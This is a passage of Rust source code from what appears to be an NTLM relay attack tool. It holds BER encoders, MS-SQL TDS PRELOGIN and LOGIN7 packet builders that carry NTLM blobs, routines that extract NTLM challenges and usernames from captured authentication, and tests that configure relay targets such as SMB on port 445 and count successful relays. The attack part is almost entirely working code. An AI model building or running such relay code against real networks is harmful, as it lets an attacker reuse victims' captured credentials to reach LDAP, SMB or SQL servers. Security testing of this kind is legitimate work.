            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in LDAP response".into()).into())
}

// ── BER helpers ──

fn ber_encode_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else if len < 65536 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            ((len >> 8) & 0xFF) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

fn ber_wrap(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut tlv = vec![tag];
    tlv.extend_from_slice(&ber_encode_length(content.len()));
    tlv.extend_from_slice(content);
    tlv
}

fn ber_octet_string(data: &[u8]) -> Vec<u8> {
    ber_wrap(0x04, data)
}

fn ber_integer(val: i64) -> Vec<u8> {
    let bytes = if val == 0 {
        vec![0x00]
    } else if val > 0 && val < 128 {
        vec![val as u8]
    } else if val > 0 && val < 256 {
        if val > 127 {
            vec![0x00, val as u8]
        } else {
            vec![val as u8]
        }
    } else {
        let be = val.to_be_bytes();
        let start = be.iter().position(|&b| b != 0).unwrap_or(7);
        // If high bit set, prepend 0x00 for positive numbers
        if val > 0 && be[start] & 0x80 != 0 {
            let mut v = vec![0x00];
            v.extend_from_slice(&be[start..]);
            v
        } else {
            be[start..].to_vec()
        }
    };
    ber_wrap(0x02, &bytes)
}

fn ber_read_length(data: &[u8], offset: usize) -> Option<(usize, usize)> {
    if offset >= data.len() {
        return None;
    }
    let first = data[offset];
    if first < 128 {
        Some((offset + 1, first as usize))
    } else {
        let num_bytes = (first & 0x7F) as usize;
        if offset + 1 + num_bytes > data.len() {
            return None;
        }
        let mut len: usize = 0;
        for i in 0..num_bytes {
            len = (len << 8) | data[offset + 1 + i] as usize;
        }
        Some((offset + 1 + num_bytes, len))
    }
}

// ═══════════════════════════════════════════════════════════
// TDS PDU Builders
// ═══════════════════════════════════════════════════════════

/// Build TDS PRELOGIN packet
fn build_tds_prelogin() -> Vec<u8> {
    let mut msg = Vec::with_capacity(48);

    // TDS header (8 bytes)
    msg.push(0x12); // Type: PRELOGIN
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x00); // PacketID
    msg.push(0x00); // Window

    // ── PRELOGIN option tokens ──
    // Each token: type(1) + offset(2) + length(2)
    // Token 0: VERSION — offset=11, length=6
    msg.push(0x00);
    msg.extend_from_slice(&11u16.to_be_bytes());
    msg.extend_from_slice(&6u16.to_be_bytes());

    // Terminator
    msg.push(0xFF);

    // VERSION data: 15.0.0.0 (SQL 2019) + SubBuild 0
    msg.extend_from_slice(&[0x0F, 0x00, 0x00, 0x00]);
    msg.extend_from_slice(&0u16.to_be_bytes());

    // Patch TDS length
    let len = msg.len() as u16;
    msg[2..4].copy_from_slice(&len.to_be_bytes());

    msg
}

/// Build TDS LOGIN7 with NTLM negotiate as SSPI blob.
///
/// Per [MS-TDS] 2.2.6.4, LOGIN7 has a 94-byte fixed header
/// followed by variable data. The SSPI blob offset/length is
/// at header offset 0x5E (ibSSPI: u16, cbSSPI: u16).
fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
    let mut msg = Vec::with_capacity(256);

    // TDS header (8 bytes)
    msg.push(0x10); // Type: LOGIN7
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x01); // PacketID
    msg.push(0x00); // Window

    // ── LOGIN7 fixed portion (94 bytes from start of TDS data) ──
    let login_start = msg.len();

    msg.extend_from_slice(&0u32.to_le_bytes()); // Length (placeholder)
    msg.extend_from_slice(&0x74000004u32.to_le_bytes()); // TDSVersion (7.4)
    msg.extend_from_slice(&4096u32.to_le_bytes()); // PacketSize
    msg.extend_from_slice(&0u32.to_le_bytes()); // ClientProgVer
    msg.extend_from_slice(&std::process::id().to_le_bytes()); // ClientPID
    msg.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
    // OptionFlags1: USE_DB_ON | INIT_DB_FATAL | SET_LANG_ON
    msg.push(0xE0);
    // OptionFlags2: INIT_LANG_FATAL | ODBC_ON | USER_NORMAL | INTEGRATED_SECURITY_ON
    msg.push(0x03);
    // TypeFlags: SQL_DFLT
    msg.push(0x00);
    // OptionFlags3
    msg.push(0x00);
    msg.extend_from_slice(&0i32.to_le_bytes()); // ClientTimeZone
    msg.extend_from_slice(&0x00000409u32.to_le_bytes()); // ClientLCID (en-US)

    // ── Offset/Length pairs (each is offset:u16, length:u16) ──
    // Variable data starts after the 94-byte fixed portion.
    // Offset is from the start of the LOGIN7 data (not TDS header).
    let var_data_offset: u16 = 94;

    // All string fields point to offset var_data_offset with length 0 (empty)
    // ibHostName, cchHostName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibUserName, cchUserName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibPassword, cchPassword
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibAppName, cchAppName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibServerName, cchServerName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibExtension (unused, 0)
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibCltIntName, cchCltIntName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibLanguage, cchLanguage
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibDatabase, cchDatabase
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // ClientID (6 bytes MAC address — zeroed)
    msg.extend_from_slice(&[0u8; 6]);

    // ibSSPI, cbSSPI — THIS IS THE KEY FIELD
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    let sspi_len = ntlm_data.len() as u16;
    msg.extend_from_slice(&sspi_len.to_le_bytes());

    // ibAtchDBFile, cchAtchDBFile
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // ibChangePassword, cchChangePassword
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // cbSSPILong (u32) — for SSPI > 65535 bytes
    msg.extend_from_slice(&(ntlm_data.len() as u32).to_le_bytes());

    // Pad to 94 bytes if needed
    while msg.len() - login_start < 94 {
        msg.push(0);
    }

    // ── Variable data: SSPI blob ──
    msg.extend_from_slice(ntlm_data);

    // Patch LOGIN7 total length
    let login_len = (msg.len() - login_start) as u32;
    msg[login_start..login_start + 4].copy_from_slice(&login_len.to_le_bytes());

    // Patch TDS packet length
    let tds_len = msg.len() as u16;
    msg[2..4].copy_from_slice(&tds_len.to_be_bytes());

    msg
}

/// Build TDS SSPI continuation packet (type 0x11)
fn build_tds_sspi_message(ntlm_data: &[u8]) -> Vec<u8> {
    let tds_len = (8 + ntlm_data.len()) as u16;
    let mut msg = Vec::with_capacity(tds_len as usize);

    msg.push(0x11); // Type: TDS7_AUTH (SSPI)
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&tds_len.to_be_bytes()); // Length
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x02); // PacketID
    msg.push(0x00); // Window

    msg.extend_from_slice(ntlm_data);
    msg
}

/// Extract NTLM challenge from TDS response
fn extract_ntlm_from_tds(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in TDS response".into()).into())
}

// ═══════════════════════════════════════════════════════════
// Utility Functions
// ═══════════════════════════════════════════════════════════

/// Parse username/domain from NTLM AUTHENTICATE message
pub fn parse_ntlm_authenticate_info(data: &[u8]) -> Result<(String, String)> {
    if data.len() < 64 {
        return Err(RelayError::Protocol("NTLM authenticate too short".into()).into());
    }

    if &data[0..8] != NTLM_SIGNATURE {
        return Err(RelayError::Protocol("Invalid NTLM signature".into()).into());
    }

    if parse_ntlm_type(data) != Some(NtlmMessageType::Authenticate) {
        return Err(RelayError::Protocol("Not an AUTHENTICATE message".into()).into());
    }

    fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
        if offset + 8 > data.len() {
            return None;
        }
        let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
        let buffer_offset = u32::from_le_bytes([
            data[offset + 4],
            data[offset + 5],
            data[offset + 6],
            data[offset + 7],
        ]) as usize;

        if len == 0 {
            return Some(Vec::new());
        }
        if buffer_offset + len <= data.len() {
            Some(data[buffer_offset..buffer_offset + len].to_vec())
        } else {
            None
        }
    }

    let domain_bytes = extract_field(data, 28).unwrap_or_default();
    let username_bytes = extract_field(data, 36).unwrap_or_default();

    let domain = decode_utf16le(&domain_bytes);
    let username = decode_utf16le(&username_bytes);

    Ok((username, domain))
}

/// Decode UTF-16LE bytes to String
fn decode_utf16le(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }
    let chars: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();
    String::from_utf16_lossy(&chars)
}

/// Base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(data)
}

/// Base64 decode
fn base64_decode(data: &str) -> Option<Vec<u8>> {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.decode(data.trim()).ok()
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};

    #[test]
    fn test_relay_config() {
        let target = RelayTarget {
            address: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 10)), 445),
            protocol: Protocol::Smb,
            username: None,
        };

        let config = RelayConfig {
            listen_ip: "0.0.0.0".to_string(),
            targets: vec![target],
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
        };

        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.targets.len(), 1);
    }

    #[tokio::test]
    async fn test_relay_lifecycle() {
        let config = RelayConfig::default();
        let mut relay = NtlmRelay::new(config);
        assert!(!relay.is_running());

        relay.start().await.unwrap();
        assert!(relay.is_running());

        relay.stop().await.unwrap();
        assert!(!relay.is_running());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(stats.successful_relays, 0);
        assert_eq!(stats.failed_relays, 0);
        assert_eq!(stats.active_connections, 0);
        assert_eq!(stats.total_attempts, 0);
    }

    #[test]
    fn test_ntlm_type_parsing() {
        let negotiate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&negotiate),
            Some(NtlmMessageType::Negotiate)
        );

        let challenge = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&challenge),
            Some(NtlmMessageType::Challenge)
        );

        let authenticate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&authenticate),
            Some(NtlmMessageType::Authenticate)
        );
    }

    #[test]
    fn test_decode_utf16le() {
        let data = [0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00];
        let result = decode_utf16le(&data);
        assert_eq!(result, "test");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn test_smb2_negotiate_structure() {
        let pdu = build_smb2_negotiate(0);
        // NetBIOS(4) + SMB2 header(64) + body(36+6 dialects)
        assert!(pdu.len() >= 68 + 36 + 6);
        // Check magic
        assert_eq!(&pdu[4..8], b"\xfeSMB");
        // Check command = NEGOTIATE (0x0000)
        assert_eq!(&pdu[16..18], &0x0000u16.to_le_bytes());
    }

    #[test]
    fn test_smb2_session_setup_structure() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00test";
        let pdu = build_smb2_session_setup(ntlm, 0x1234, 1);
        // Check magic
        assert_eq!(&pdu[4..8], b"\xfeSMB");
        // Check command = SESSION_SETUP (0x0001)
        assert_eq!(&pdu[16..18], &0x0001u16.to_le_bytes());
        // Check session ID at absolute offset 44..52 (netbios=4 + smb2_field_offset=40)
        let sid = u64::from_le_bytes([
            pdu[44], pdu[45], pdu[46], pdu[47], pdu[48], pdu[49], pdu[50], pdu[51],
        ]);
        assert_eq!(sid, 0x1234);
    }

    #[test]
    fn test_ber_encode_length() {
        assert_eq!(ber_encode_length(5), vec![5]);
        assert_eq!(ber_encode_length(127), vec![127]);
        assert_eq!(ber_encode_length(128), vec![0x81, 128]);
        assert_eq!(ber_encode_length(300), vec![0x82, 0x01, 0x2C]);
    }

    #[test]
    fn test_ldap_sasl_bind_is_valid_ber() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00testdata1234567890";
        let bind = build_ldap_sasl_bind(ntlm, 1);
        // Must start with SEQUENCE tag
        assert_eq!(bind[0], 0x30);
        // Must contain "GSS-SPNEGO"
        let contains_mechanism = bind.windows(10).any(|w| w == b"GSS-SPNEGO");
        assert!(contains_mechanism);
    }

    #[test]
    fn test_tds_prelogin_header() {
        let pdu = build_tds_prelogin();
        assert_eq!(pdu[0], 0x12); // PRELOGIN
        assert_eq!(pdu[1], 0x01); // EOM
        let len = u16::from_be_bytes([pdu[2], pdu[3]]);
        assert_eq!(len as usize, pdu.len());
    }

    #[test]
    fn test_tds_login7_sspi() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00";
        let pdu = build_tds_login7_sspi(ntlm);
        assert_eq!(pdu[0], 0x10); // LOGIN7
        let tds_len = u16::from_be_bytes([pdu[2], pdu[3]]);
        assert_eq!(tds_len as usize, pdu.len());
        // SSPI data should be at the end
        let end = &pdu[pdu.len() - ntlm.len()..];
        assert_eq!(end, ntlm);
    }
}
